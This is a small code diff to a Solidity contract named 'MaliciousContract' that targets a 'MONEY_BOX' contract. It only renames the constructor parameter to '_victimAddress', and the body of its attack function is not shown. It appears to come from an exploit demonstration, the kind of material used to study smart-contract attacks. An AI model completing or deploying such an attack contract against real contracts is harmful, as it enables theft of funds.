@@ -5,8 +5,8 @@ contract MaliciousContract{
     MONEY_BOX money_box;
     
 
-    constructor(address _money_box) public{
-        money_box= MONEY_BOX (_money_box);
+    constructor(address _victimAddress) public{
+        money_box= MONEY_BOX (_victimAddress);
     }
 
    function attack(uint amount) public {
